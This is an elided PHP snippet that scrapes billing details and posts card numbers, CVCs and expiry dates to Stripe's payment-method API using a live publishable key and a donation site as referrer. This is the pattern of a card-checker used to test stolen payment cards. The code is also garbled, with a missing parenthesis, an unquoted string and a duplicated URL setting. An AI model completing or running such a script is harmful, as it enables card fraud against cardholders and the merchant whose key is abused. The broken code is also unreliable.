...
$phone = $matches1[1][0];
preg_match_all("(\"Zip\":(.*),\")siU", $get, $matches1);
$Zip = $matches1[1][0];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]= '.$address.
'&billing_details[address][line2]=' .$street. 'address&billing_details[address][city]=' .$city.
'&billing_details[address][state]=' .$state. '&billing_details[address][Zip]='.$Zip. 
'&billing_details[address][country]='.$country.'&card[number]='.$cc. 
'&card[cvc]='.$cvv. '&card[exp_month]='.$mes. '&card[exp_year]='.$ano.
&guid=16d4e3fc-7d14-441e-9eeb-930b3cd1a195dfc315&muid=3bf357d1-ac6e-4e50-9c6a-a8b32c9a0108745162
&sid=f041afcc-536f-47f0-94bf-f11abf5a008bd18e13
&pasted_fields=number&payment_user_agent=stripe.js%2F8c6f8685b%3B+stripe-js-v3%2F8c6f8685b
&time_on_page=488477&referrer=https%3A%2F%2Fdanisdreamscorp.org%2F&key=pk_live_w6cA8dLbm82jYFproB2TQ9ud00v388z0lk
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url;
curl_setopt($ch, CURLOPT_URL, 'js.stripe.com ');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://js.stripe.com'.$cctwo.'');
